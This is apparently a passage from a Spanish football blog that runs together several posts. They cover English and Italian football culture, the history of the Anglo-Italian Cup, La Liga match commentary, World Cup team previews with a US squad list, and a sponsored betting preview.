ha diluido con la clase baja de una forma palpable. Los recién ascendidos difícilmente dan guerra en las últimas ediciones, suelen ser carne de cañón. Arriba están los de siempre. La alternancia en el poder es más mítica que real. A excepción del Southsampton y del batacazo del United, a día de hoy están los de siempre. El Liverpool parece haber recuperado el pulso pero uno de los favoritos, el City de Pellegrini, responde más al modelo “español” del fútbol que al inglés, es decir: equipo inflado con dinero de fortuna privada, creado a golpe de talonario. Poco hay de esencia en esto. Como poca esencia británica hubo en el Chelsea dominador de hace unos años.La moda de lo vintage pasará. El fútbol británico de los ochenta es una delicia pero hay una tendencia global de la que nadie puede huir. Todo esto es un enorme negocio y la autenticidad se pervierte o se integra en la maquinaria económica. El otro día hablaba con Sergio Cortina en Málaga –de esa conversación estas palabras- sobre la autenticidad del fútbol italiano.Yo, hoy, valiente como el que más, animo a reivindicar a aquella Holanda del 88. A recordar a Koeman, Gullit o Wouters en el 90. Al Bergkamp del 94. A Stam y Overmars en el 2000. Adidas, Lotto y Nike. Un duro peregrinar de la excelencia a la marrullería urbana. Una travesía oscura desde la belleza de las tres hojas a la modernidad fluorescente de la marca más antifutbolera. Esperemos el camino contrario. Ahora que la final está perdida, hay que retomar los valores que hicieron grandes a la selección Oranje. Que vuelvan a Adidas, que dejen el karate, que recuerden como era aquello de jugar bonito. Démosle una nueva oportunidad. Pongámonos, humildemente, la camiseta de los perdedores. Hoy, justo cuando Manchester City y Tottenham se juegan ser el cuarto equipo en la mejor liga del mundo, es más que oportuno recordar aquello. Era 1981, era la repetición de la final de Copa entre el City y los Spurs, era Wembley un contenedor palpitante de 92.000 personas y fue Ricardo Villa. Con el marcador igualado en el dos, un argentino flacucho aceleró hasta el corazón de la defensa celeste para bailar un vals. En la cal reagateó hacia la izquierda con la derecha acompasando su cuerpo para colarlo entre dos rivales. Llegaron muchos problemas pero usó su izquierda, con talento se encajó aun más en el enjambre e inutilizó a tres muñecos blancos antes de ajusticiar al portero. 3-2 para matar la final. Minutos antes poco más que un bulto barbudo y sospechoso en una temporada lamentable, héroe del día tras la jugada, Tricky Villa estrenaba apodo y nacía como leyenda del club y del torneo. En 1969 el Swindon Town, un infraequipo de tercera, levantó la tapa de la alcantarilla y ojeó el panorama. Para cuando quisieron darse cuenta estaban en mitad del viejo Wembley levantado la Copa de la Liga frente a un tal Arsenal. Los gunners adujeron que ocho de los suyos habían jugado con gripe y que aquella noche había un postre de chocolate por césped pero lo cierto es que se volvieron a casa con la cara mojada por un equipo que malvivía dos estratos por debajo de la superficie. Y el suceso, claro, se celebro por todo lo alto en el pueblo hasta que la UEFA, imagino una voz emergiendo al estilo de los supertacañones, decidió aportar algo al respecto. El Swindon se había ganado el derecho a su periplo europeo pero el alto mando, en un prodigio de injusticia, decidió impedirles tal privilegio alegando que el club procedía de una división demasiado baja. La misma cacicada que se habían sacado de la manga poco antes con el Queens Park Rangers.Pero mientras tanto, en su hotelito londinense, un mercachifle calabrés acababa de inventar una pomada que calmaría en parte las dolencias del Swindon. Allí, quizá ensimismado con el bullicio propio de Marble Arch, Gigi Peronace (un representante de futbolistas que hizo fama y dinero importando estrellas británicas al calcio) acababa de parir una fórmula que estaría destinada a devolverle al Swindon algo de lo que los supertacañones le habían robado. Nacían así la Copa Anglo-Italiana de la Liga y la Copa Anglo-Italiana, una involucrando en una liguilla por grupos a seis equipos menores de cada país y otra una final a doble partido entre los vencedores de la Copa de Italia y los de la Copa de Liga inglesa. ¿Suena enrevesado? Espero que sí porque el invento realmente lo era.En 1969, la edición inaugural de esta especie de Torneo Konami que se dio en llamar Copa Anglo-Italiana de la Liga, el que funcionaba como liguilla, fue a parar a las polvorientas vitrinas del Swindon Town. Doblegaron a la Roma. Y un año más tarde los robins supieron prolongar su racha en campeonatos estrafalarios de nuevo cuño plantándose en la final de la Copa Anglo-Italiana para barrer al Nápoles en San Paolo ante 55.000 almas. La derrota debió escocer en el templo partenopeo porque el partido tuvo que ser suspendido en el minuto 79 cuando los altercados en la grada local comenzaban a pasar ya de castaño oscuro. Aquello da idea de que, incomprensiblemente, el campeonato gozaba ya de un cierto predicamento.Claro que los buenos tiempos acabaron pronto. Las dos ediciones siguientes de la extravagancia fueron las últimas en las que los organizadores decidieron involucrar a equipos profesionales. Una se la embolsó la Roma y otra el Newcastle, en ambas ocasiones ante el Blackpool. A partir de ahí un tobogán barnizado en decadencia. Languideciendo hasta 1986 la anglo-italiana extravagancia se convirtió en un contenedor de medianías semi-profesionales del que salieron victoriosos potencias como el Monza, el Bath City, el Sutton o el Modena. Mientras tanto la idea, che idea, iba pasando de manos de un patrocinador a otro. La Copa Alitalia, la Copa Talbot o el Memorial Gigi Peronace fueron las sucesivas reencarnaciones del asunto.El otro torneo, la doble final entre ingleses e italianos, continuó hasta 1976 con un paréntesis entre el 72 y el 74 y casi siempre con victoria inglesa, exceptuando la edición que la Fiorentina le supo arrebatar al West Ham. La cosa no tenía ya excesivo prestigio, no se vayan a creer, aunque que los parroquianos del Manchester City o del Tottenham todavía incluyen el trofeo en la lista cuando les da por hacer recuento de honores. Sumando para la estrellita…Inexplicablemente, alguien quiso desenterrar al muerto en 1992 y organizar un infame torneo entre equipos italianos e ingleses de segunda división que yo solo recuerdo por la imagen de un Massimo Cacciatori, entrenador del Ancona, molido a palos durante la auténtica batalla campal en la que mutó su cita contra el Birmingham. En 1995  un Wembley desangelado, apenas 12.000 butacas vendidas, acogió el canto del cisne del renacido torneo con un pobre espectáculo entre un Notts County, ya descendido a tercera, y el Ascoli. Imagino que con Gigi Peronace y los pioneros del Swindon revolviéndose en sus ataudes. ‘Michu Selección’ ya no es solo un gruñido para sordos o una pancarta graciosa en Los Manolos. Puede que no pero creo que lo entiendo mejor por ser oviedista. Me lo parece cuando recuerdo su primer gol con el equipo hace ya diez años. Acabábamos de bajar a Tercera y jugábamos contra el Siero uno de los primeros partidos de esta broma infinita. El Tartiere estaba aquel día como el horizonte, embarrado hastá límites cercanos al lugar común. La megafonía, porque aquel día no había ni marcador en condiciones, a punto de oxidarse por falta de uso. Era uno de esos días en los que el Oviedo solo genera ganas de acuchillar a alguien hasta que debutó un chavalín con granos en los mofletes y la barra de potencia al 100%. Michu apareció en mitad de los charcos para aclarar el panorama. Michu apareció entre los centrales y batió por bajo al portero con la derecha siendo zurdo. Michu olvidó jerarquías, se fajó y resolvió en el 80′. Tirando de recurso, de picardía y huevos en un partido fabricado para rascar, correr y chutar.Ya es bastante, viniendo de donde vienen.Posible once inicial: Szczesny; Piszczek, Wasilewski, Perquis, Boenisch; Murawski, Polanski, Kuba, Dudka, Obraniak; Lewandowski.Pronóstico DDF: En un grupo de muy difícil pronóstico, la motivación y la condición de local les presta chance para pasar la primera fase, aunque parece muy igualado con la República Checa. Si avanzan tienen muy complicado pasar a cuartos, donde presumiblemente encontrarán a Holanda, Portugal o Alemania. La vuelta del Barbas. Contaba Enric González hace tiempo que un jugador con barba es ridículo o especial. Desde que alguien confió en el jerezano que llevaba demasiados años perforando redes en Segunda, la carrera de Güiza ha sumado un mundo de eventos que lo han colocado tozudamente en la segunda categoría: el 4-0 al Barça, la vaselina en la Euro, matrimonio con Nuria Bermúdez, extraña huida a Estambul, eterno dique seco, y ahora una travesía del desierto para volver a sentirse futbolista en el lugar donde es más querido y recordado. Segundos tiempos para entrar en la dinámica marcada por García Plaza, y hoy por fin un doblete sobre el que empezar a construir. Esperanza.Aferrados a la gloria. Dos minutos restaban, y se escurría el liderato por las rendijas del Ciudad de Valencia. Con él se iban estos días mágicos, de titulares, entrevistas y sonrisas, de párpados frotados y lágrimas de alegría, mirando cien veces una clasificación casi irreal. Era demasiado que perder, con casi la garantía de que el sueño no volverá. Así que fue la fe del desesperado la que guió el inteligente friqui de Rubén Suárez, un balazo en el corazón de la Liga que confirmó, junto al gol de Nano, que algún dios misericordioso sigue brindando una mano amiga al Grupo Salvaje.La supervivencia cotidiana. Conviene escuchar a Guardiola cuando habla. Hace unas semanas le preguntaron si veía al Sporting haciéndole la cama al entrenador, y contestó algo así como: “¿vosotros creéis que un equipo entregado correría como el Sporting lo ha hecho hoy?” . No le faltaba razón al noi de Santpedor, y media de hora de raza en Son Moix le ha valido a los asturianos para firmar un 6 de 6 y cerrar una de esas espantosas rachas que de vez en cuando azotan al equipo de Preciado. Hoy la redención ha llegado por la banda derecha, primero con una impresionante incursión de Lora para regalar un caramelo al necesitado Bilic, y luego con un centro tan medido de De las Cuevas que Joao Víctor sólo ha podido bendecir la bola antes de que entrase. Fin del infierno otoñal en Gijón, pues, y a comenzar a competir con calma. The Man in Black. En un mal día para el petrofútbol –cayó el PSG en Dijon y el City pasó un rato bastante malo en Molineux antes de sacar el mazo- el Málaga volvió a mostrar esa imagen nebulosa tan frecuente últimamente, y fue zarandeado en Vallecas más de lo que puede justificar la discutible expulsión de Eliseu. Nadie personifica mejor la situación que Ruud Van Nistelrooy, que llegó arropado por una confianza mucho mayor que hace cinco años, y de momento se pasea por la liga española como el pálido fantasma de un pasado glorioso. No es tanto que sólo lleve un gol, sino que apenas hemos visto sus desmarques, sus apoyos, su hambre, y sobre todo ese instinto depredador que le convirtió en un delantero de leyenda. Si es el último paso antes de la retirada, que sea rápido, por favor.Realizando el concepto. Cada hincha tiene en la cabeza una idea de lo que su equipo debería ser, una imagen ideal que impulsa su identificación, quizá el mejor partido que le haya visto, una historia escuchada de pequeño o la narración de un gran cronista. Es muy posible que el primer cuarto de hora de anoche en el Bernabéu signifique algo muy parecido a esto para los madridistas que lo han presenciado. La presión desbocada en el área rival, combinaciones de un nivel técnico descomunal a velocidad supersónica, producción industrial de oportunidades, conjunción perfecta de lo físico y lo técnico, dos goles legales y uno anulado que pudieron ser cinco. Podrá discutirse si es lícito dejarse ir después una hora, pero esos quince minutos de superioridad cósmica han mostrado no sólo el mejor juego del Madrid en muchos años, sino el mejor juego al modo en que le gusta al Bernabéu. Todos estábamos más o menos convencidos de que iba a ocurrir, pero quizá no tan pronto. El Sevilla acaba de hacer público el cese en sus funciones del entrenador Antonio Álvarez, después de la derrota del equipo hispalense en el Rico Pérez (2-0). Es verdad que los resultados en Liga no habían sido malos hasta ahora, pero la sensación que desprende el equipo es pobrísima, mezcla de rutina, desesperanza y desilusión. En esta tesitura Del Nido, que nunca ha acabado de confiar en el hombre de la casa –a pesar de haber puesto el equipo en sus manos esta temporada- ha cortado por lo sano para enrolar a Goyo Manzano, experto en equipos bajos de moral y poseedor de un currículo que lo avala. Veremos el resultado que puede obtener el profesor de estos jugadores, y si logra llevar al club al lugar preeminente que ha ocupado en los últimos años.Dile a Khedira, revalorizado campeón del mundo, que busque nuevos aires porque no encaja en los planes (o sí, pero hay que darle puerta). Dile a Luka Modric, faro del último campeón de Europa, que haga un hueco al nuevo y que comparta la merienda con él. Y entonces sí. Entonces pon a jugar a Toni Kroos. No habrá aficionado al fútbol que sobrepase la treintena (y algunos ya la sobrepasamos con creces) para el que los nombres de Eric Wynalda, Tony Meola, Alexi Lalas, Paul Caligiuri o Tab Ramos no tengan reservado un hueco especial en su memoria. El equipo con el que Estados Unidos se presentó a su Mundial para decirle al mundo que ellos también eran capaces de jugar al fútbol con los pies ilustra los recuerdos de varias generaciones y ha ido mitificándose con el paso de los años. Aquel era un grupo carismático, terriblemente carismático, con nombres chocantes y una estética que no terminaba de encajar con la imagen que en la muy futbolística Europa teníamos de los jugadores de fútbol. Pero no solo era la cuestión visual. Era un conjunto emocionalmente muy atractivo: la nación más poderosa del mundo, la referencia política e industrial del planeta, veía de pronto reducido su papel al de un simple outsider, un modesto participante más que veía con una mezcla de envidia y admiración lo que otras naciones como Alemania, Italia, Brasil o Argentina venían a ofrecerles en su propia casa. Por una vez, Estados Unidos no era la referencia, no era el rival a batir sino un contendiente modesto y novato. Los papeles invertidos. Aquel equipo pasó tremendos apuros para pasar de la fase de grupos y terminó cayendo en octavos de final ante la futura campeona, Brasil. Su aventura duró poco y, sin embargo, nadie lo ha olvidado.Creo que para comprender a un país o a un sociedad hay que rozarse con ellos. La imagen que yo tenía de Estados Unidos cambió de forma radical el día que pude experimentar ese roce. Lo que me habían vendido desde la infancia, vaya usted a saber por qué, como una nación ególatra, prepotente, maleducada y fría resultó ser todo lo contrario. La población media de Estados Unidos es amable, extraordinariamente educada y, sobre todo, contagiosamente entusiasta. Tiene su actitud vital un punto naïf, casi infantil. Disfrutan cada materia en la que se desempeñan como lo disfrutaría un niño, con una mezcla de inocencia y entusiasmo no exenta de un afán de superación y perfeccionamiento encomiable. Resulta imposible no admirar esa actitud.Anoche, tras confirmarse la derrota de la selección estadounidense en la prórroga del partido que debía de consagrar al equipo de Klinsmann como uno de los ocho mejores del planeta, las cuentas de Twitter oficiales de la gran mayoría de instituciones oficiales (Casa Blanca incluida), federaciones y entidades deportivas del país, se rindieron ante el trabajo bien hecho de sus representantes en este Mundial. ‘Muy orgullosos de vosotros‘, ‘nos hicisteis creer‘, ‘orgullosos de ser estadounidenses‘, ‘gracias, chicos, extraordinario trabajo‘… Las muestras de felicitación y agradecimiento hacia el combinado norteamericano inundaron la red social hasta varias horas después de que Lukaku y De Bruyne ajusticiaran a los de Klinsi. Cuando uno se esfuerza, cuando uno pelea, lucha, trabaja y se deja el alma en lo que se propone, es de justicia reconocerlo. Es la cultura del esfuerzo, tan valorada en unos lugares y tan denostada en otros. Si no triunfas, si no logras el éxito pero has puesto todos los medios a tu alcance para intentarlo, merecerás todo el reconocimiento.Y fue así como un equipo modesto, sin nombres ni grandes estrellas, con jugadores procedentes de la liga local y de otras ligas menores, se ganó el cariño y la admiración de todos. Estados Unidos sorprendió, emocionó, enamoró, estremeció, divirtió y conmovió al aficionado neutral, y eso es algo tremendamente complicado. Fueron esas reacciones post partido casi unánimes las que me ayudaron a percibirlo. Wynalda, Ramos, Meola, Lalas, Wegerle, Caligiuri y compañía ya tenían sucesores.Mañana a las 21:30 se enfrentan en el Nou Camp Barcelona y Betis en partido correspondiente a la penúltima jornada de la primera vuelta. Sin embargo, esta es una información que a las 12:30 de la mañana no puede extraerse, por ejemplo, de la versión de El Mundo Deportivo para iPhone. Si uno entra al portal de dicha aplicación, encuentra información sobre el posible fichaje de Neymar por el Barça, los árbitros de los Clásicos de Copa, el Balón de Oro de Messi, el posible once culé del miércoles en el Santiago Bernabéu, y hasta la biografía de un joven defensa del equipo juvenil, Sergio Ayala. Como si este fin de semana la Liga se hubiera suspendido. Un síntoma extraño.El Barcelona está viviendo su relación con la Liga esta temporada desde una extraña esquizofrenia. Por un lado, el consenso sobre su liderazgo en el fútbol mundial es total: tres títulos al zurrón,  incluyendo exhibición frente al Santos en el partido que todo el mundo ve; dominio absoluto en las votaciones de premios a los mejores de la temporada; la inmediata adaptación al equipo –cifras cantan- de uno de los mejores centrocampistas del mundo, Cesc Fábregas. Y sobre todo, una sensación de distancia con el Real Madrid que parece mantenerse como mínimo intocable en cada enfrentamiento mutuo. Un panorama, a priori, inmejorable.Sin embargo, la realidad es que en la competición doméstica, la que viene determinada por el día a día –aunque no la más importante- el Barça mira hacia arriba y ve cinco puntos de diferencia con un líder cuyo fortín acaba de asaltar. La circunstancia puede interpretarse positivamente, como en el anterior párrafo, pero también desde el punto de vista de que el vigente campeón pudo despedirse de la Liga en Diciembre. Un equipo, por otro lado, que está firmando una tarjeta como local que hace temblar a cualquiera: ocho victorias, un solo empate con penalty fallado en el descuento, 39 goles a favor y, lo que es casi kafkiano, portería imbatida. Números de coloso.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Está claro que el problema está en las salidas, en las que los números son los de una escuadra de media tabla (2-4-2, 12-9). Se han buscado multitud de explicaciones puntuales: falta de acierto, dificultad para cerrar los partidos, exceso de relax en la ventaja (Anoeta), extramotivación del contrario (Cornellá), demasiadas licencias tácticas de Guardiola (Mestalla), decisiones arbitrales desafortunadas, etc. Seguramente todos estos razonamientos tienen su parte cierta, pero la Historia nos enseña que cuando un equipo grandioso empieza a fallar repetidamente fuera ante rivales menores, el problema suele tener que ver con la desmotivación y el hastío. Todos sabemos que es difícil guardar un Balón de Oro en la vitrina y luego ir a jugársela a un campo pequeño, con el público encima y la gloria lejos, mucho que perder y poco que ganar. Pero eso precisamente es lo que estos años ha hecho como nadie el Barça de Guardiola, y constituye en éste el gran desafío del fenomenal técnico catalán. Porque el Mundial de Clubes empieza ganándose en el El Molinón, El Sardinero o el Coliseo Alfonso Pérez.El Betis es un equipo que suele jugarle a los grandes sin mayores complejos, y todos tenemos aún en la retina la meritoria eliminatoria de Copa contra el Barça el año pasado. Por tanto, la posibilidad de un partido con goles es bastante alta. En bwin, por ejemplo, la apuesta por más de cuatro goles en el partido se paga a 2,35, y a 3,75 si nos vamos a más de cinco goles. En este escenario, no sería extraño que el Betis lograse al menos un gol, máxime si tenemos en cuenta que el equipo andaluz está en forma últimamente: romper el récord de imbatibilidad se paga 3 a 1. Y si hablamos de nombres, no es nada descabellado pensar en 2,30 que dejaría un doblete de Messi, o en los 6 de uno similar de Cesc Fábregas. Para pensárselo. Argentina. Caída en cuartos de final. Cuatro partidos ganados y uno perdido, con diez goles anotados y seis encajados. Goleadores: Higuaín (4), Tévez (2), Heinze, Demichelis, Palermo y un gol en propia puerta.Lo mejor: las combinaciones en ataque a la velocidad de la luz y la facilidad goleadora de una vanguardia en la que no pudieron brillar ni Agüero ni Milito por falta de sitio.Lo peor: el desprecio al juego en el centro del campo, cuyas consecuencias pudieron verse ante el primer rival de entidad con el que se cruzaron los argentinos, y la actitud de Maradona durante todo el torneo.La estrella: todos los delanteros brillaron hasta octavos y se difuminaron en el último partido, así que nos quedaremos con el Pipa Higuaín en su calidad de máximo goleador del equipo.El momento: el gol de Thomas Müller en el minuto 3 del partido contra Alemania marcó el principio del fin, y abrió la puerta a un ridículo planetario.Corea del Sur. Caída en octavos de final. Un partido ganado, otro empatado y dos perdidos, con seis goles marcados y ocho encajados. Goleadores: Lee Chung-Soo (3), Park Ji-Sung, Park Chu-Young y Lee Chung-Yong. Lo mejor: su actitud ofensiva durante todo el torneo, acorde con la tradición del fútbol asiático, y en particular su segundo tiempo contra Grecia, de lo mejor del Mundial.y.Lo peor: debilidad en la defensa de la estrategia, juego aéreo y centros laterales, y algunos errores atrás, como el del portero Sung-Ryong frente a Uruguay.La estrella: Park Ji-Sung.Sobre lo impredecible de su fútbol y la manida comparación con el fútbol inglés. Pensamos en Cañas, ex del Betis y ahora en el Swansea, jugando en la Roma por ejemplo. ¿Triunfaría de giallorosso? Lo dudo. La sensación, sólo la sensación, es que la Liga Inglesa es más accesible para futbolistas normalitos, que hay un enjambre de equipos modestos. Fantaseamos con la posibilidad de un Elche llegando a puestos europeos si jugara en la Barclays Premier League. No voy a ensalzar lo italiano para criticar lo inglés, pero creo que se nos está escapando un buen fútbol -menos plásticos pero igualmente apasionante- por cosas accesorias al propio deporte.Lo antiguo está de moda. También en fútbol. Tengo la sensación con el fútbol de las islas que nos pasaba como antes, cuando comprábamos un disco por la portada más que por las canciones que había en el interior. Este año veré más Calcio que Premier. Hay más miga tras los Alpes que en la Pérfida Albión. Reconozco que los instrumentos Fender envejecidos son bonitos. Pero puestos a gastarnos el dinero, quién puede perderse el Roma-Nápoles que se jugará dentro de un par de semanas. Hace un año, con motivo de la Copa Confederaciones, profeticé el descalabro de EEUU en el torneo y cuestioné el interés que el fútbol tenía en el gigante americano. Lamentaba que un país tan rico, tan volcado en el deporte, no hubiera conseguido instaurar un campeonato doméstico de calidad, una buena infraestructura deportiva para captar a buenos jugadores, y, como consecuencia de todo ello, una selección nacional que no actuara de poco menos que de comparsa en las citas internacionales. Aquel artículo se desmoronó, como tantos otros, cuando la realidad del juego se distanció de lo escrito sobre él. EEUU levantó cabeza, se clasificó para la semifinal y allí barrió a España. Ya en la final plantó cara a Brasil y, aunque perdiera, se convirtió en la gran vencedora del campeonato. Esta pequeña gesta sirvió para resituar en el panorama futbolística a un combinado pobre, que salvo las excentricidades del 94, pocas simpatías había granjeado entre los aficionados.Nos viene el recuerdo de Tony Meola, de Lallas, y ese aire amateur que destilaba un equipo que representaba a un país ajeno al fútbol. Las marcas de los campos de fútbol americano borrosas sobra el césped. Todo forma parte de un pasado aparcado. La MLS sigue siendo la misma chapuza de barras y estrellas de siempre, ni Beckham u otras tantas figuras europeas en su periplo norteamericano lograron dignificar un campeonato hueco, despoblado, con un nivel muy pobre; pero ahora se ha empezado a trabajar en una red futbolística a nivel nacional que permite el rápido reclutamiento de jóvenes promesas para jugar al máximo nivel, parece que las instituciones empiezan a tomarlo en serio. Además de eso, el aumento competitivo del combinado nacional tiene una explicación obvia: los mejores jugadores vienen a Europa a jugar, a empaparse de una concepción original del fútbol, a aprender en los mismos campos donde se arrancó la tradición. Con estos factores adivinamos el continuo crecimiento del interés, o al menos, de la profesionalización de un deporte que rozaba la poca profesionalidad hace no demasiado tiempo. Esta vez acuden a Sudáfrica un palmo por encima que en su última cita global. El grupo permite soñar con llegar a octavos.Demasiadas bajas ha tenido que capear Bradley, el dramático accidente de Davies o la rotura de Onyewu. El bloque llega algo mermado, con jugadores nuevos, como Gómez y Torres, del Pachuca; que intentan equilibrar a un equipo que demostró el verano pasado en Sudáfrica que tiene fuerza actuando en conjunto, presionando como un bloque, solidariamente. Sobre el campo ocuparan los roles propios del 4-4-2. En la portería ha demostrado ya muchas veces su valía Howard. Ex del Manchester y actual jugador del Everton, tuvo un papel decisivo en la Confederaciones. A la izquierda Bocanegra, a la derecha Cherundolo. En el centro de la defensa no sabemos si rendirá aún Onyewu. Toda potencia, verdadero capataz de la defensa, al que le llegó la oportunidad soñada fichando por el Milán pero que por una grave lesión no ha podido demostrar lo que apuntó el pasado año. Acompañándolo, posiblemente, estará el expeditivo Demerit. Intermitente este año, incluso perdiendo el puesto en el clasificatorio, pero que puede aportar seguridad y potencia en una competición como el Mundial. Por delante la dupla que viene apuntalando la media jugarán Clark y Bradley. Tal vez la irrupción de Torres cambie la pareja, o incluso la entrada de Edu o Feilhaber por el jugador del Eintracht, que no ha tenido un buen año por las citadas lesiones. En las esquinas prácticamente segura la presencia de Dempsey, por la derecha, y de Donovan por la izquierda. El del Fulham y el Galaxy y Everton aportan el talento y la creación en un equipo algo rígido cuando tiene la pelota en su poder. Donovan ha demostrado ser determinante en una selección poco acostumbrada al talento. Junto a Bradley, son los dos jugadores más capacitados para hacer que EEUU avance rondas en este torneo. Delante, y sin el lastimado Davies, Altidore y Buddle. El jugador del Villarreal sigue sin explotar en Europa, pero tiene edad para crecer aún.Buddle es un jugador más discreto, pero este año ha comenzado su temporada jugando muy bien. Su puesto está sorteado entre Gómez y Findley.No parece, a priori, un equipo muy competitivo. Pero ejemplos como el de la Copa Confederaciones el año pasado obligan a ser prudentes. En la CONCACAF tienen la medida cogida al resto de equipos. Hace no demasiado, en Corea en 2002, llegaron a cuartos de final. Su fútbol está en ascensión. Como decía hace un año, una lástima que el público norteamericano no se vuelque completamente con el deporte más jugado del planeta. Si pulieran algunos detalles, por extensión y cultura deportiva, EEUU podrían ser más tenidos en cuenta. Sin ir más lejos, su fútbol femenino está a la cabeza mundial. En este mundial, en su Grupo C, pueden tener asequible quitarse a Argelia y Eslovenia. Los veo más equipo que europeos y africanos. Con Inglaterra será otro cantar, pero supongo que Capello, entre los partidos más vistos de estas semanas, tendrá aquel en el que EEUU hizo historia derrotando a España, la actual campeona de Europa.Lo mejor: Un equipo que se conoce, muy trabajado, con un entrenador capacitado para competir al más alto nivel.Lo peor: Las bajas pueden ser muy acusadas, sobre todo la del delantero del Sochaux Charles Davies.Jugador a seguir: La estrella del equipo, el hijo del entrenador, Michael Bradley. Un centrocampista total.Pronóstico de DDF: Con muchas opciones de llegar a los Octavos de Final. En el cruce podrían encontrarse a Alemania, y eso serían ya palabras mayores.La lista de 23 de EEUU:PORTEROSBrad Guzan (Aston Villa, Inglaterra)Marcus Hahnemann (Wolverhampton, Inglaterra)Tim Howard (Everton, Inglaterra)DEFENSASCarlos Bocanegra (Rennes, Francia)Jonathan Bornstein (Chivas EEUU)Steve Cherundolo (Hannover, Alemania)Jay DeMerit (Watford, Inglaterra)Clarence Goodson (IK Start, Noruega)Oguchi Onyewu (Milan, Italia)Jonathan Spector (West Ham, Inglaterra)MEDIOSDaMarcus Beasley (Glasgow Rangers, Escocia)Michael Bradley (Borussia Moenchengladbach, Alemania)Ricardo Clark (Eintracht Francfort, Alemania)Clint Dempsey (Fulham, Inglaterra)Landon Donovan (Los Angeles)Maurice Edu (Glasgow Rangers, Escocia)Benny Feilhaber (AGF Aarhus, Dinamarca)Stuart Holden (Bolton, Inglaterra)José Francisco Torres (Pachuca, México)DELANTEROSJozy Altidore (Hull, Inglaterra)Edson Buddle (Los Angeles)Robbie Findley (Salt Lake)Hérculez Gómez (Pachuca, México) Empezó mal el equipo de Van Gaal. No es que el Bayern haya destacado alguna vez por su juego fluido o sus balones al pie, pero los jugadores no tenían mordiente, ni sangre y todo parecía tener un final negro. Ni los nuevos fichajes se afianzaban ni el entrenador era capaz de hacer que la máquina bávara metiera algo de miedo a los rivales. En la Bundesliga pronto se descolgó de la cabeza -demasiados empates ante los humildes-  y en la Liga de Campeones atravesó serios apuros en los primeros duelos, incluyendo la doble derrota contra un Girondins que les pasó por encima. Desde luego el entrenador holandés, que había llegado al banquillo del Allianz Arena como estrella tras una excelente temporada al frente del AZ holandés, sabe como sorprendernos y entre el 1-4 a la Juve en la última jornada de la liguilla de la Champions y el recién alcanzado liderato en la liga doméstica germana, ha vuelto a poner en el escaparate al histórico club muniqués. Esta noche, frente a la Fiorentina, podrán confirmar las buenas nuevas sensaciones transmitidas en los últimos meses.El 2-1 de la ida es, como dice el tópico, un resultado engañoso. Ese postrero gol de Klose en situación ilegal que arrebataba a los pupilos de Prandelli un meritorio empate no puede asegurar un partido plácido en la capital toscana. Tampoco hay que sobrestimar al conjunto viola, a la deriva en el Calcio y que, pese a cuajar una buena primera fase de Champions, no está entonado últimamente. El Bayern ha recuperado la disciplina defensiva y ha encontrado en Badstuber a un sustituto de calidad del lesionado Demichelis. Pero, más allá de esa fortaleza en equilibrio entre defensa y mediocampo -rejuvenecido Van Bommel incluído-, Van Gaal ha tenido como aliados a los cuatro hombres más brillantes de su plantilla: Ribery, Robben, Müller y Gómez. Y, de entre todos ellos, fundamentalmente, el eléctrico extremo holandés que ha sabido echarse el equipo a sus espaldas y ha devenido en fundamental para la mejora del juego en esta fase de la temporada.El míster de la Fiore avisa que su equipo jugará feo esta noche.La velocidad y combinación de los jugadores de arriba serán las armas para perforar la previsible fortificación italiana. Un pírrico 1-0 puede acabar con el trayecto alemán, así que marcar será imprescindible en el Artemio Franchi. De pasar,  el equipo bávaro volverá a ser un rival a tener en cuenta tras un principio más que dubitativo. La mano de Van Gaal está, por fin, obrando el milagro que esperaban los aficionados de Munich para su equipo, demasiado alejado últimamente de la élite europea. Ninguna derrota puede excusarse cuando solo vale ganar. Los empates se ven como un –2 y no como un +1. Ni las bajas, ni la calidad del rival, ni una mala tarde pueden justificar la no suma de tres puntos. Ese es el nivel de exigencia de nuestra Liga por culpa de un Barcelona que roza la excelencia. Es una carrera de gordos contra flacos en las que unos van sudando y con la boca abierta mientras los otros se permiten hasta ir charlando.Zidane es menos Zidane de lo que parecía. El Madrid sigue arrastrando las mismas dudas, los mismos balbuceantes argumentos. No tiene capacidad para sobreponerse a la adversidad, no controla los partidos, la defensa no sostiene la arquitectura del equipo. Ayer Gracia ideó un plan que tampoco debería sorprendernos tanto: presión muy alta y espacio para los laterales. La idea era pillarlos a la contra, buscarle las cosquillas a una retaguardia pálida y de papelillo. Ramos se sigue perdiendo en su propia retórica. Nacho no es Varane, y ya no sé si eso es bueno o es malo. “Adiós a la Liga” cantaban en La Rosaleda, aunque el míster madridista lo negara en la rueda de prensa. Quedan muchos partidos, esa es la verdad. Y al Madrid le encantan estos retos de hombría. Es un club de trepar en la adversidad, montañeros a los puntos. Eliminatorias desiguales, espíritus de Juanito y goles de Higuiaín. Ese mundo de deshacer lo inevitable. Sacrificar la lírica para abandonarse a la épica. El sentido trágico de la existencia, el florentinismo más burbujeante. Excusas portadistas, mal de muchos, heroicidades en pantalón corto. Un mundo que me resulta ajeno, forzado y de escuálido consuelo. Las cosas se ganan cuando hay que ganarlas, no es debilidad sino fuerza. No hay nada más glorioso que lo mundano.Mientras el Barcelona, inalterable, como una de esas máquinas eternas que abren y cierran cajones en el Ikea demostrando la calidad de los muebles. Fríos y constantes. Luis Enrique era runner, me parece sintomático. Ese ritmo incesante, pesado, sin resuello. Qué buenos tiempos para ser culé. Y luego está Messi, la nandrolona natural del equipo cuando se hacen previsibles los pases y se nota la acumulación de partidos. Él siempre está despierto como los vaqueros en las películas. A la luz de la hoguera con el rifle apoyado en el regazo. Con un ojo abierto por si hay que meter la bola en la portería rival. Y por más que duelan las palabras de Piqué, ahí hay una historia: la del odio al vecino, que es el odio más español que existe. Y cuando digo español, lo hago respetando las nacionalidades. Y esas cosas. Al final, quién iba a decirlo, Lillo tenía razón e importan más las patatas que el solomillo.Entendedme: que al final se habla más de lo que menos importancia tiene. Si nos centramos en el fútbol, el modelo del Barcelona (con sus corruptelas, sus sanciones y sus presidentes) debería ser estudiado. Desde Rijkaard hasta Luis Enrique, hay un ideario que no existe desde Queiroz hasta Zidane. Todo empezó en el 2003. Los Rijkaard, Guardiola, Vilanova, Roura, Martino y Luis Enrique son una línea más o menos equilibrada, discursiva, elocuente y los Queiroz, Camacho, García Remón, Luxemburgo, López Caro, Capello, Schuster, Ramos, Pellegrini, Mourinho, Ancelotti, Benítez y Zidane parecen sacados de ese cajón que está en todas las casas que mezcla monedas de peseta, lápices, ganchillos de la abuela, muñecos del Kinder y barriguitas 